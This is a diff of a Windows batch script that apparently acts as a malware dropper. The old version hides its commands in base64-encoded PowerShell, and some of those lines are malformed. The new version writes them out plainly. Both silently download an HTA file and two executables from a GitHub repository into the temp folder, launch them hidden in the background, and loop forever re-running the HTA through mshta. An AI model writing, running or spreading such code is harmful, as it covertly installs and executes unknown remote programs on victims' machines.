@@ -1,22 +1,22 @@
-:top0 
-timeout /t 1 & 
-powershell.exe -exec bypass -enc cABvAHcAZQByAHMAaABlAGwAbAAgAC0AVwBpAG4AZABvAHcAIABIAGkAZABkAGUAbgAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGoAaQBuAGEAZgBhAHoALwBIAG8AbQBlAC8AbQBhAHMAdABlAHIALwBtAGEAdABoAGUAdwAuAGgAdABhACAALQBPAHUAdABmAGkAbABlACAAQwA6AC8AVwBpAG4AZABvAHcAcwAvAFQAZQBtAHAALwBtAGEAdABoAGUAdwAuAGgAdABhAA== 
-goto top1 
+:top0
+ timeout /t 1 &
+powershell -Window Hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/jinafaz/Home/master/mathew.hta -Outfile %tmp%/mathew.hta
+goto top1
 
-:top1 
-timeout /t 1 & 
-powershell.exe -exec bypass -enc powershell.exe -exec bypass -enc cABvAHcAZQByAHMAaABlAGwAbAAgAC0AVwBpAG4AZABvAHcAIABIAGkAZABkAGUAbgAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGoAaQBuAGEAZgBhAHoALwBIAG8AbQBlAC8AbQBhAHMAdABlAHIALwBtAGEAcgBpAG8ALgBlAHgAZQAgAC0ATwB1AHQAZgBpAGwAZQAgAEMAOgBXAGkAbgBkAG8AdwBzAC8AVABlAG0AcAAvAG0AYQByAGkAbwAuAGUAeABlAA==  
-cmd /c start /B C:/Windows/Temp/mario.exe 
-goto top2 
+:top1
+ timeout /t 1 &
+powershell -Window Hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/jinafaz/Home/master/mario.exe -Outfile %tmp%/mario.exe
+cmd /c start /B %tmp%/mario.exe
+goto top2
 
-:top2 
-timeout /t 1 & 
-powershell.exe -exec bypass -enc powershell.exe -exec bypass -enc cABvAHcAZQByAHMAaABlAGwAbAAgAC0AVwBpAG4AZABvAHcAIABIAGkAZABkAGUAbgAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGoAaQBuAGEAZgBhAHoALwBIAG8AbQBlAC8AbQBhAHMAdABlAHIALwBjAG8AcgBhAGwALgBlAHgAZQAgAC0ATwB1AHQAZgBpAGwAZQAgAEMAOgBXAGkAbgBkAG8AdwBzAC8AVABlAG0AcAAvAGMAbwByAGEAbAAuAGUAeABlAA==  
-cmd /c start /B C:/Windows/Temp/coral.exe 
+:top2
+ timeout /t 1 &
+powershell -Window Hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/jinafaz/Home/master/coral.exe -Outfile %tmp%/coral.exe
+cmd /c start /B %tmp%/coral.exe
 goto top3 
 
-:top3  
-timeout /t 100 & 
-taskkill /IM mshta.exe /F 
-powershell invoke-expression 'mshta C:/Windows/Temp/mathew.hta' 
+:top3 
+timeout /t 100 &
+taskkill /IM mshta.exe /F
+powershell invoke-expression 'mshta %tmp%/mathew.hta'
 goto top3
